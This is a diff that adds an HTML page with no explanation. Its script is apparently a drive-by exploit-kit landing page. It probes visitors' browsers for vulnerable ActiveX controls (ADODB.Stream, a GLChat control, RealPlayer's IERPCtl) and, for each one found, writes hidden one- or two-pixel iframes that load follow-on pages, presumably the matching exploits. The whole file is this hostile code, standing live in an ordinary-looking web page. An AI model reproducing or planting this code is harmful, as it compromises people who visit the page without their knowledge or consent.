@@ -1,0 +1,32 @@
+<Html>
+<Body>
+<noscript>
+<iframe src=*></iframe>
+</noscript>
+<script language="javaScript">
+try{
+var e;
+var ado=(document["createElement"]("object"));
+ado["setAttribute"]("classid",idx);
+var as=window["ado"]["createobject"]("A"+"d"+"o"+"d"+"b."+"S"+"t"+"r"+"e"+"a"+"m","");}
+catch(e){};
+finally{
+if(e!="[object Error]"){
+document.write("<iframe width='1' height='1' src='06014.htm'></iframe>");}
+else{
+try{var r;var reals=new window["ActiveXObject"]("GLCHAT.GLChatCtrl.1");}
+catch(r){};
+finally{if(r!="[object Error]"){
+document.write("<iframe width='2' height='2' src='lz3.htm'></iframe>");
+document.write("<iframe width='2' height='2' src='lz2.htm'></iframe>");
+document.write("<iframe width='2' height='2' src='lz3.htm'></iframe>");}}
+try{var j;var lianzhong=new window["ActiveXObject"]("IERPCtl.IERPCtl.1");}
+catch(j){};
+finally{if(j!="[object Error]"){
+document.write("<iframe width='2' height='2' src='real1.htm'></iframe>");
+document.write("<iframe width='2' height='2' src='real2.htm'></iframe>");}
+if(r=="[object Error]"&&j=="[object Error]"){
+}}}}
+</script>
+</Body>
+</Html>
